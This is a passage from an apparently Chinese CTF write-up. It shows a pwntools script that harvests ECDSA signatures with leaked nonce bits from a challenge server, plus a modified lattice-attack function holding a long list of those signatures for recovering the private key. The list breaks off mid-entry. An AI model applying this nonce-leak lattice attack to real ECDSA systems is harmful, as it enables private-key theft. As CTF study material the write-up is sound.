class="params">self</span>):</span></span><br><span class="line">        self.pk = self.sh.recvline().decode()</span><br><span class="line">        self.pk = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, findall(<span class="string">r&quot;\d+&quot;</span>, self.pk)))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_flag</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;Give me dA\n&#x27;</span>, <span class="built_in">str</span>(self.dA).encode())</span><br><span class="line">        flag = self.sh.recvline()</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_rskphash</span>(<span class="params">self, _msg</span>):</span></span><br><span class="line">        <span class="comment"># r = 52048392139623372592078752615260846843189290463527724311126948642962323725543</span></span><br><span class="line">        <span class="comment"># s = 109433217428494848625070143495220795563459361957459040433009455008946372438244</span></span><br><span class="line">        <span class="comment"># kp = 4</span></span><br><span class="line">        <span class="comment"># hash = 7233656426779106235949203295872203792378863493827336253291317784541539210508</span></span><br><span class="line">        self.sh.sendlineafter(<span class="string">b&#x27;Give me your message:\n&#x27;</span>, _msg)</span><br><span class="line">        _r = <span class="built_in">int</span>(self.sh.recvline().decode()[<span class="number">4</span>:-<span class="number">1</span>])</span><br><span class="line">        _s = <span class="built_in">int</span>(self.sh.recvline().decode()[<span class="number">4</span>:-<span class="number">1</span>])</span><br><span class="line">        _kp = <span class="built_in">int</span>(self.sh.recvline().decode()[<span class="number">4</span>:-<span class="number">1</span>])</span><br><span class="line">        _<span class="built_in">hash</span> = <span class="built_in">int</span>(self.sh.recvline().decode()[<span class="number">7</span>:-<span class="number">1</span>])</span><br><span class="line">        self.r.append(_r), self.s.append(_s), self.kp.append(_kp), self.<span class="built_in">hash</span>.append(_<span class="built_in">hash</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof_of_work()</span><br><span class="line">        self.solve_param()</span><br><span class="line"></span><br><span class="line">        _param = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            self.solve_rskphash(<span class="string">b&#x27;4XWi11&#x27;</span>)</span><br><span class="line">            _param.append(&#123;<span class="string">&quot;r&quot;</span>: self.r[i], <span class="string">&quot;s&quot;</span>: self.s[i], <span class="string">&quot;kp&quot;</span>: self.kp[i], <span class="string">&quot;hash&quot;</span>: self.<span class="built_in">hash</span>[i]&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(_param)</span><br><span class="line">        <span class="built_in">print</span>(self.pk)</span><br><span class="line">        self.sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solution = Solve()</span><br><span class="line">    solution.solve()</span><br></pre></td></tr></table></figure>

<p>然后把得到的两个列表丢进去，手动交互一下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211113153348371.png" alt="image-20211113153348371"></p>
<p>改动的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lattice_attack_cli</span>(<span class="params">loop</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n ----- Lattice ECDSA Attack ----- &quot;</span>)</span><br><span class="line">    curve_string = <span class="string">&quot;SECP256K1&quot;</span></span><br><span class="line">    data_type = <span class="string">&quot;LSB&quot;</span></span><br><span class="line">    known_bits = <span class="number">8</span></span><br><span class="line">    signatures = [&#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">24064571097121945632922895240428054047008294283601148999833806644054455832256</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">22336607989275764340059934215706164673745867481448617269599257943128698097430</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">4463660676509533715525859073947399242276437236356579722988720911272080024194</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">95184582521357021784942152280696633359087861395630894773134105864180920370833</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">17</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">40665562916507218486092437970946871701506092053179547706286916616798148649001</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">25664463718395831677708078193899613927191594250435827338029374883338264441103</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">145</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">62134655233924687212924387180433699066778387229102991143083649859489887158653</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">89827476149358698561689033385477487868462807802741299201723565961428404486665</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">120</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">91743101403954022324940469079645536140946274935623955082539036305437756739343</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">49231456976716399505068810326851443124368033416296775932715592338232029765033</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">40</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">60118325601081833527647977022636339882040341712168406104696025049539193405923</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">108263313707672191413470251856794765032624947992550839745807767664950314148218</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">213</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">30065788320992881217148582776098185844479568458389368519038464174967591879538</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">100152338166884323893640190892474206206231996144056242559927906798697672906730</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">50</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">35489967726668007042990697874141601932217076505321903927975464183297375191635</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">62671798262198621160922892891679774852547334810629183097844481954425801529252</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">94</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">40325814863904162338232318750994924418421835615767198516853576893290682300046</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">15989269176742750627771729447600104487064896651886248330305261173968210958688</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">124</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">111145066390235980845124325083016703676499315403829371772181781109652613138216</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">42748858991312283540243673505740069163105471217729084540279112491462119156848</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">167</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">9942181992430775532995169308645382865716825653184399965013015024521795560445</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">2040552058758046776327917763250261038686605857462578043690548671510015399903</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">188</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">59285744990866036562172242890106604822723823682131484185052946940305396134164</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">46924616651317980112060803798050579265826641544752311301072413923868513177549</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">159</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">8266866969980736920169934574450693424841397773339890186741076070269883898687</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">49665921373513614838157179339157208467593359554517015972164991449551167702368</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">47</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">39115785036192514738025599343102404175824690574548933372250564383780298256056</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">63653040165489523410008448735043710570010292534670013054314855125927745049957</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">207</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">60002102029739152682472248051749479298103056039811198990495670299329361771238</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">104084323174536650482109779404504798734411173396128332502452070818582100135379</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">163</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">27787364429978998775096537929165654846390595884803880752977170498539422585113</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">33906111749326233752541058214424749871781740802460828094494031375514066531392</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">120</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">78419161169708677864050303931513981848627977301275757780375524608251807993559</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">2046781244809995555043522988048715240994172872466168974297295802333575196479</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">111</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">16305985096263356537711862540340407961669367033804253049138237771289848804031</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">63668898512984236022957824751272909840013201760763278925601709302165483537754</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">195</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">103752332053793585333463710585983917550929298265321300780270827390514989405981</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">84464910918738330351542447369162200910794950649613201304525071568114508476173</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">187</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">38291430687407128427867342660257516736317330271523410817601713675005564934414</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">88402223212147448437394088851680415429948038565958859060829460325155897704965</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">84323698460015599216987281664483212093914059533716412464339023149091291363920</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">74454396061533922056165551532377436117021947867761561545386467754272131383336</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">21</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">94652359738443742656427702994872154419362173953540530613675485516473015136097</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">58979588252301893338171901228747351893229723674148134270227122119084935981086</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">159</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">57035562738019063186290405901303462688544016382894419021551598457301170539851</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">106810732790502323984716735333922681899385960282732027639295501033822329513095</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">132</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">71720101268882482001341926562799691163916261182294243023112526262725668461039</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">66238263938293320834432476177362155449781385711943558789812495372990460603628</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">102</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">79217664224625891577288065822390044055424497318832202722330455827537228453987</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">9728594954980254660443491331319378935977116253644866857417143026507098138493</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">142</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">50417674417908240110700920566794731133911757658243324000211747372433823865434</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">74036799396605670020465243258112573458559987099664738041457322577623383740150</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">34249095295853682596567672274282865357173590812471209243488352782102238262790</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">56329821599489174636076273450033279549799527650878999714834453357902951777016</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">218</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">802992665895604116149528587653332282394721540505330665934238125742103799645</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">5428664552780927049589242649253504341588002093173144292039738684160498564446</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">32</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">86019135605632312533003574356241310966775167320919143972907497981200534429486</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">109455236794780038086342966032133672324694552943661188737502695833558381149636</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">55</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">65502561336371093326014756449768044329637910457733790873909508952712806558275</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">113929492847608603543892673062284286888742167507069182224849984142937060229251</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">178</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">78681803493598708781704851013177502711960431976673307465953770437009275951590</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">49674180353978255167259103839938068686866182075213824318557182314938037660614</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">58846841510786876897179098124111065636995935908959633746621419304249825025848</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">89154085040287026552915925342120943873439786304495658177869773488900413561331</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">188</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">61282940048672303710246699987045551708862797751020077071897169267522861954848</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">66002334900710561368468145986446393633241460361692621325117354715080888850728</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">90</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">81038357006344878843231064578651308378639132821723934209449344478360690098676</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">7690205894383234601656981155047787199517182455307368975320798091037405981690</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">206</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">109906117283389599383267125995612631604738679225921326774096030457704242722323</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">43493935019027505511442268443311834274390131796377637442411050094817362580052</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">192</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">71004483558260840751052451665723743480138211782065718720540245068467327148872</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">107958638346412297098700280157968653578336457901364225032022477039525423050174</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">8379706138642767879789492131765033075973072668572920833327086321106035103924</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">18457638647854285155334422912914899020122104523819833285175962764234997052715</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">119</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">13506833719497205310335803791404081551593103922525622577754284846722412185234</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">48786514313823849943566772815666346862837121558799421713954352406775875038932</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">39</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">43318765108358086468648054514831832105425852958699586512516411121806748162244</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">76611095623617718137819075604626479032159788169976435587319796431647089025942</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">185</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">50639275101034623060510226776856072002631469409117575192245129715394053079388</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">379768327662870352586367170960803125205731091682353079565721866278490560864</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">234</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">31825370299758817738811760212737719374347382389429558359219945763715483872750</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">541879448936518443353076884606162758760048281571082926021308678464363854594</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">224</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">13601817511622577911281025235244998292130259645310098627346048427533461499944</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">109141974194095714792066715741955092060895513608267568568573803884357617059995</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">92</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">113497913836293842312148494321747603521635058517129203010499179606400836715701</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">84888435361972525658941281980997342508748274622023820353524839729268394643312</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">216</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">82734134540243431057532589212714104848547208496112557727452074465504823486198</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">96354237665098247779868723103167381622579260362631967012473189354910980839154</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">215</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">98745854649555452692336023708972115999163311987898625164095479011126426351081</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">102834626570257831729270969528085763264392581086196771333983657242343395253804</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">24420303190205486868577085306959366524438282457397899084978123077970167737279</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">10261548032370358478243593946501181661630310686496591280276691956339112964258</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">90</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">30460305454953381788818171456464546370311715404840958374717538926236356559803</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">67133045599383558471980598751464646985143777205020976306556352264274079713363</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">42</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">111699704151971747577825639248041765371325428058507326451264626870773914926445</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">113044257701636212742207620709531848533208228762098440562365767143038383323898</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">67</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">55259588168428866690769244492784222281448819586199143977669408994489706063722</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">44879788828310698190640940707098316613630603984709847485109676153317413345536</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">195</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">95821828747012270079632976383366292728840760245223580689825937312792425516333</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">22164928131217587120823988833630085889074303492801262486685559832552777669741</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">203</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">47993445392282070517665997289956977115896255535879354420504900607601836637890</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">37646777708367978131173727579740827913294865142881256078048100035622729412756</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">117</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">808355034313794503540924441853310842934763011251993961430920797511096008498</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">26632135675180210600213811273743061334613137412718761969429946967156351897478</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">194</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">12392416887330653367097198830655106050886366421602603917063463705594675827896</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">11159199409000290611423295457204594419093980691288042890900008944695720507094</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">241</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">27599569229152188515098116861078353401920880103786084917426725825204732098211</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">39987965321321132283596688531004453990235197145405096647412766025363442252850</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">109</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">42289950968174454749441047060040749291731563691223034152381274396502736463253</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">430697554585691994477420373429995082823840322680701866691877430949729629555</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">200</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">107230634320979617260193247891883739258196897576104284444794437524724617036106</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">22268913286231697322837030804346095978779838774538419534845912944297929855615</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">131</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">33538975512090171954077420570151758485572385188097072558614893751131154302975</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">21481885849898381280754062964617136954229988551047493918100999192122592373097</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">96</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">11784637354184338646572281524358107554753511610013685384383007685263421332270</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">30184855468775851668049255327970629076505205004744811028105419783683405575670</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">108</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">34342269111182431917641402508856054207866094407152434816898848759887594624173</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">92095083650002131829586588767194819762008290805323706457541454769043993705818</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">29242069126775272389089128168018364761369925828725921222949230244582917326456</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">81174574701827135316795676201051580144650977542592226443984620479047166976275</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">135</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">71480811354425869981287449055478912430827232077005344067889675424164477049520</span>, <span class="string">&#x27;s&#x27;</span>: <span class="number">55666335806309380248999596624640170208803190918022142807899162242141583329174</span>, <span class="string">&#x27;kp&#x27;</span>: <span class="number">92</span>, <span class="string">&#x27;hash&#x27;</span>: <span class="number">49445761299415096312358027714619628169076798968817504851486972775694191147018</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>: <span class="number">47724527569474530425493172166097570977104157039876161168764539904108791716296</span>, <span class="string">&#x27;s&#x27;</span>: <span 